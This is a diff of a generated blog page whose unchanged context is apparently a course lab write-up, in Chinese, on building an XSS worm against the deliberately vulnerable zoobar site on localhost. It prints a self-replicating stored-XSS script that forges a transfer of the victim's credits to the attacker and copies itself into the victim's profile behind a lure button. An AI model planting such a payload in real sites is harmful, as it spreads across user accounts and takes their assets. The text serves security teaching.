@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="web security," />
 
 
 
@@ -98,7 +98,7 @@ XSS&amp;#x53C8;&amp;#x79F0;CSS&amp;#xFF0C;&amp;#x5168;&amp;#x79F0;Cross Site Scr
 <meta property="og:image" content="http://oimbmvqt3.bkt.clouddn.com/4.PNG">
 <meta property="og:image" content="http://oimbmvqt3.bkt.clouddn.com/5.PNG">
 <meta property="og:image" content="http://oimbmvqt3.bkt.clouddn.com/6.PNG">
-<meta property="og:updated_time" content="2016-12-23T10:02:26.728Z">
+<meta property="og:updated_time" content="2016-12-29T08:49:40.370Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS worm">
 <meta name="twitter:description" content="&amp;#x4E00;&amp;#x3001;XSS&amp;#x653B;&amp;#x51FB;&amp;#x539F;&amp;#x7406;
@@ -300,6 +300,28 @@ XSS&amp;#x53C8;&amp;#x79F0;CSS&amp;#xFF0C;&amp;#x5168;&amp;#x79F0;Cross Site Scr
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/course-notes/" itemprop="url" rel="index">
+                    <span itemprop="name">course notes</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -333,12 +355,12 @@ XSS&amp;#x53C8;&amp;#x79F0;CSS&amp;#xFF0C;&amp;#x5168;&amp;#x79F0;Cross Site Scr
 <li>linux&#x73AF;&#x5883;&#x4E0B;&#xFF0C; &#x5B89;&#x88C5;apache2&#x3001;mysql,&#x3001;php5&#x3002;</li>
 <li>&#x5C06;myzoo&#x6587;&#x4EF6;&#x90E8;&#x7F72;&#x5230;apache2&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x6CE8;&#x610F;&#x5728;mysql&#x4E2D;&#x521B;&#x5EFA;&#x7684;&#x6570;&#x636E;&#x5E93;&#x548C;&#x8868;&#xFF0C;&#x8981;&#x548C;zoobar&#x7F51;&#x7AD9;&#x6E90;&#x7801;&#x4E2D;&#x5BF9;&#x5E94;&#x3002;</li>
 </ol>
-<h3 id="&#x4E09;&#x3001;&#x5229;&#x7528;javascript&#x5B9E;&#x73B0;&#x5B9E;&#x73B0;XSS-worm"><a href="#&#x4E09;&#x3001;&#x5229;&#x7528;javascript&#x5B9E;&#x73B0;&#x5B9E;&#x73B0;XSS-worm" class="headerlink" title="&#x4E09;&#x3001;&#x5229;&#x7528;javascript&#x5B9E;&#x73B0;&#x5B9E;&#x73B0;XSS worm"></a>&#x4E09;&#x3001;&#x5229;&#x7528;javascript&#x5B9E;&#x73B0;&#x5B9E;&#x73B0;XSS worm</h3><h4 id="1&#x3001;&#x653B;&#x51FB;&#x539F;&#x7406;"><a href="#1&#x3001;&#x653B;&#x51FB;&#x539F;&#x7406;" class="headerlink" title="1&#x3001;&#x653B;&#x51FB;&#x539F;&#x7406;"></a>1&#x3001;&#x653B;&#x51FB;&#x539F;&#x7406;</h4><ul>
+<h3 id="&#x4E09;&#x3001;&#x5229;&#x7528;javascript&#x5B9E;&#x73B0;&#x5B9E;&#x73B0;XSS-worm"><a href="#&#x4E09;&#x3001;&#x5229;&#x7528;javascript&#x5B9E;&#x73B0;&#x5B9E;&#x73B0;XSS-worm" class="headerlink" title="&#x4E09;&#x3001;&#x5229;&#x7528;javascript&#x5B9E;&#x73B0;&#x5B9E;&#x73B0;XSS worm"></a>&#x4E09;&#x3001;&#x5229;&#x7528;javascript&#x5B9E;&#x73B0;&#x5B9E;&#x73B0;XSS worm</h3><h4 id="1&#x3001;&#x653B;&#x51FB;&#x539F;&#x7406;"><a href="#1&#x3001;&#x653B;&#x51FB;&#x539F;&#x7406;" class="headerlink" title="1&#x3001;&#x653B;&#x51FB;&#x539F;&#x7406;"></a>1&#x3001;&#x653B;&#x51FB;&#x539F;&#x7406;</h4><a id="more"></a>
+<ul>
 <li>&#x5728;zoobar&#x7F51;&#x7AD9;&#x4E0A;&#x6CE8;&#x518C;&#x4E86;&#x7528;&#x6237;A&#x3001;B&#x3002;&#x5176;&#x4E2D;A&#x4F5C;&#x4E3A;&#x653B;&#x51FB;&#x8005;&#x3002;A&#x3001;B&#x8D44;&#x6599;&#x9875;&#x9762;&#x90FD;&#x6709;profile&#x680F;&#x53EF;&#x4F9B;&#x8F93;&#x5165;&#x3002;&#x7406;&#x8BBA;&#x4E0A;&#xFF0C;&#x6240;&#x6709;&#x53EF;&#x8F93;&#x5165;&#x7684;&#x5730;&#x65B9;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5BF9;&#x8F93;&#x5165;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x90FD;&#x4F1A;&#x5B58;&#x5728;XSS&#x6F0F;&#x6D1E;&#xFF0C;&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x5BB3;&#x53D6;&#x51B3;&#x4E8E;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x7684;&#x5A01;&#x529B;&#x3002;</li>
 <li>&#x5F53;B&#x770B;A&#x7684;&#x7B80;&#x4ECB;&#x65F6;&#xFF0C;B&#x7684;&#x4E00;&#x4E2A;zoobar&#x88AB;&#x8F6C;&#x79FB;&#x7ED9;A&#x3002;&#x6B64;&#x65F6;&#x662F;&#x5728;B&#x7684;&#x767B;&#x9646;&#x9875;&#x9762;&#xFF0C;B&#x770B;A&#x7684;&#x7B80;&#x4ECB;&#x65F6;&#x6267;&#x884C;&#x4E86;&#x4E00;&#x6BB5;&#x811A;&#x672C;&#xFF0C;&#x8BE5;&#x811A;&#x672C;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x662F;&#x4EE5;&#x81EA;&#x5DF1;&#x7684;cookie&#x53D1;&#x9001;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x4EE5;B&#x7684;&#x540D;&#x4E49;&#xFF0C;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8F6C;&#x79FB;zoobar&#x7684;&#x8868;&#x5355;&#x3002;</li>
 <li>&#x5F53;&#x7528;&#x6237;B&#x770B;A&#x7684;&#x7B80;&#x4ECB;&#x65F6;&#xFF0C;&#x81EA;&#x5DF1;&#x7684;&#x7B80;&#x4ECB;&#x4F1A;&#x88AB;&#x6539;&#x52A8;&#xFF0C;&#x8BF4;&#x660E;A&#x4F2A;&#x9020;&#x4E86;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x63D0;&#x4EA4;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;B&#x7684;&#x7B80;&#x4ECB;&#x3002;&#x6211;&#x4EEC;&#x8981;&#x770B;&#x5F53;B&#x4FDD;&#x5B58;&#x81EA;&#x5DF1;&#x7684;&#x7B80;&#x4ECB;&#xFF0C;&#x70B9;&#x51FB;save&#x6309;&#x94AE;&#x65F6;&#xFF0C;&#x5411;&#x670D;&#x52A1;&#x5668;&#x4F20;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#x4EC0;&#x4E48;&#xFF0C;&#x7136;&#x540E;&#x6839;&#x636E;&#x8BE5;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;&#x3002;</li>
 </ul>
-<a id="more"></a>
 <h4 id="2&#x3001;&#x653B;&#x51FB;&#x5B9E;&#x73B0;"><a href="#2&#x3001;&#x653B;&#x51FB;&#x5B9E;&#x73B0;" class="headerlink" title="2&#x3001;&#x653B;&#x51FB;&#x5B9E;&#x73B0;"></a>2&#x3001;&#x653B;&#x51FB;&#x5B9E;&#x73B0;</h4><p>&#x5728;A&#x7684;profile&#x4E2D;&#x8F93;&#x5165;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">&lt;script id=sc1&gt;</div><div class="line">function Steel() //&#x8F6C;&#x79FB;&#x53D7;&#x5BB3;&#x8005;&#x7684;&#x4E00;&#x4E2A;zoobar&#x7ED9;&#x653B;&#x51FB;&#x8005;</div><div class="line">{</div><div class="line">	var steelURL=&quot;https://localhost/transfer.php&quot;;  //&#x63D0;&#x4EA4;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x54EA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5730;&#x5740;&#x662F;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x4F2A;&#x9020;&#x7684;</div><div class="line">	var postStr1=&quot;zoobars=1&amp;recipient=a&amp;submission=Send&quot;;  //&#x9700;&#x8981;&#x6211;&#x4EEC;&#x4F2A;&#x9020;&#xFF0C;&#x5199;&#x7684;&#x662F;&#x9ED8;&#x8BA4;&#x8F6C;&#x79FB;&#x4E00;&#x4E2A;zoobar&#x7ED9;&#x7528;&#x6237;a</div><div class="line">	var ajax1=null;</div><div class="line">	if(window.XMLHttpRequest)</div><div class="line">	{</div><div class="line">		ajax1=new XMLHttpRequest();</div><div class="line">	}</div><div class="line">	else</div><div class="line">		return;</div><div class="line">	ajax1.open(&quot;POST&quot;,steelURL,true);</div><div class="line">	ajax1.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">	ajax1.send(postStr1);</div><div class="line">}</div><div class="line">function Update()  //&#x66F4;&#x65B0;&#x53D7;&#x5BB3;&#x8005;&#x7684;profile&#x548C;&#x653B;&#x51FB;&#x8005;&#x4E00;&#x6837;</div><div class="line">{</div><div class="line">	var updateURL=&quot;https://localhost/index.php&quot;;  </div><div class="line">	var ajax2=null;</div><div class="line">	if(window.XMLHttpRequest)</div><div class="line">	{</div><div class="line">		ajax2=new XMLHttpRequest();</div><div class="line">	}</div><div class="line">	else</div><div class="line">		return;</div><div class="line">	ajax2.open(&quot;POST&quot;,updateURL,true);</div><div class="line">	var script=document.getElementById(&quot;sc1&quot;).innerHTML;</div><div class="line">	var script_clean = encodeURIComponent(script); </div><div class="line">	var postStr2=&quot;profile_update=&quot;;</div><div class="line">	postStr2=postStr2.concat(&quot;&lt;scr&quot;); </div><div class="line">	postStr2=postStr2.concat(&quot;ipt &quot;);</div><div class="line">	postStr2=postStr2.concat(&quot;id=sc1&gt;&quot;);</div><div class="line">	postStr2=postStr2.concat(script_clean);</div><div class="line">	postStr2=postStr2.concat(&quot;&lt;/scr&quot;);</div><div class="line">	postStr2=postStr2.concat(&quot;ipt&gt;&quot;);</div><div class="line">	postStr2=postStr2.concat(&quot;&lt;button type=button onclick={Steel();Update()}&gt;IPHONE 7&lt;button&gt;&quot;);</div><div class="line">	postStr2=postStr2.concat(&quot;&amp;profile_submit=Save&quot;);</div><div class="line">	ajax2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">	ajax2.send(postStr2);</div><div class="line"></div><div class="line">	ajax2.onreadystatechange=function()</div><div class="line">	{</div><div class="line">		if(ajax2.readyState==4&amp;&amp;ajax2.status==200)</div><div class="line">		{</div><div class="line">			alert(&quot;Uha!Your zoobar is mine!&quot;);</div><div class="line">		}</div><div class="line">	}</div><div class="line">}</div><div class="line">/* </div><div class="line"> * &#x4E3A;&#x4F7F;&#x4EE3;&#x7801;&#x53EF;&#x8FD0;&#x884C;&#xFF0C;&#x5728;zoobar&#x7F51;&#x7AD9;&#x7684;users.php&#x6587;&#x4EF6;&#x4E2D;allowed_tags&#x91CC;&#x52A0;&#x4E0A;&lt;script&gt;&#x6807;&#x7B7E;&#x3001;&lt;button&gt;&#x6807;&#x7B7E;&#xFF0C;</div><div class="line"> * disallow&#x91CC;&#x6CE8;&#x91CA;&#x6389;javascript&#x548C;button,</div><div class="line"> */</div><div class="line">/* </div><div class="line"> * &#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;button&#xFF0C;&#x5F53;&#x70B9;&#x51FB;&#x8BE5;button&#x65F6;&#xFF0C;&#x6267;&#x884C;&#x7684;&#x662F;&#x4E00;&#x4E2A;function&#xFF0C;&#x8BE5;function&#x4F2A;&#x9020;&#x4E86;&#x4E00;&#x4E2A;&#x8868;&#x5355;&#x8BF7;&#x6C42;&#x63D0;&#x4EA4;&#x7ED9;&#x670D;&#x52A1;&#x5668;</div><div class="line"> */</div><div class="line">&lt;/script&gt;&lt;button type=button onclick={Steel();Update()}&gt;IPHONE 7&lt;/button&gt;</div></pre></td></tr></table></figure></p>
 <p>&#x5728;&#x653B;&#x51FB;&#x8005;A&#x7684;profile&#x4E2D;&#x5199;&#x5165;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#xFF0C;A&#x73B0;&#x5728;&#x7684;zoobar&#x6709;21&#x4E2A;<br><img src="http://oimbmvqt3.bkt.clouddn.com/1.jpg" alt=""></p>
 <p>&#x767B;&#x5F55;&#x53D7;&#x5BB3;&#x8005;C&#xFF0C;C&#x6B64;&#x65F6;&#x6709;10&#x4E2A;zoobar&#xFF0C;profile&#x4E3A;&#x7A7A;<br><img src="http://oimbmvqt3.bkt.clouddn.com/2.PNG" alt=""></p>
@@ -366,6 +388,12 @@ XSS&amp;#x53C8;&amp;#x79F0;CSS&amp;#xFF0C;&amp;#x5168;&amp;#x79F0;Cross Site Scr
 
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-security/" rel="tag"># web security</a>
+          
+        </div>
       
 
       
@@ -461,7 +489,21 @@ XSS&amp;#x53C8;&amp;#x79F0;CSS&amp;#xFF0C;&amp;#x5168;&amp;#x79F0;Cross Site Scr
           
 
           
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">categories</span>
+              
+            </div>
+          
 
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
           
 
         </nav>
